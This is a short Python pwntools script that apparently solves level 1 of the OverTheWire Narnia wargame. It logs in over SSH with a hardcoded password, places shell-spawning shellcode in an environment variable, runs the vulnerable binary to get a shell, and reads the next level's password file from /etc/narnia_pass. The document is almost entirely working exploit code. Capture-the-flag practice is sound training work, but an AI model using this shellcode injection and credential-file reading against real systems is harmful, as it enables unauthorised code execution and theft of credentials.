#!/usr/bin/env python
#encoding:utf-8

import os
from pwn import *
from utils import *

level = 1
host = 'narnia.labs.overthewire.org'
user = 'narnia%d' % level
bin_file = 'narnia%d' % level
password = 'efeidiedae'
pass_file = '/etc/narnia_pass/narnia%d' % (level + 1)
bin_path = '/narnia/%s' % bin_file
source_path = '/narnia/%s.c' % bin_file

# context.log_level = 'debug'
shell = ssh(host=host, user=user, password=password)
# Download challenge related files if not exists.
if not os.path.exists(bin_file):
    shell.download_file(bin_path)
    shell.download_file(source_path)

io = shell.run('bash')
io.sendline('export EGG=$%r' % asm(shellcraft.sh()))
# io.sendline('echo $EGG')
# io.recv()
io.sendline(bin_path)
io.clean()

io.sendline('id')
log.info('id: %s' % io.recv())
io.sendline('cat %s' % pass_file)
password = io.recv()
log.success('Password: %s' % password)
